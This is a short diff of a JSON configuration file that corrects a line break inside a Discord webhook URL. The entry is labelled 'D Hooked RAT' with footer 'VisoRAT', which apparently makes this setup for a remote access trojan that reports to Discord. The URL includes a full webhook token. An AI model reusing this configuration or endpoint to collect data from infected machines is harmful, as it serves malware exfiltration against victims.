@@ -8,8 +8,7 @@
         "/receive": {
             "webhooks": [
                 {
-                    "url": "https://discord.com/api/webhooks/1509403005320167455/gio7NxcVjPuPOdgQsfnT6kQqlovduZ1GluELhiA34Uq3-ehLIpHK3IgvnlJDoJa-cjD9
-					",
+                    "url": "https://discord.com/api/webhooks/1509403005320167455/gio7NxcVjPuPOdgQsfnT6kQqlovduZ1GluELhiA34Uq3-ehLIpHK3IgvnlJDoJa-cjD9",
                     "name": "D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
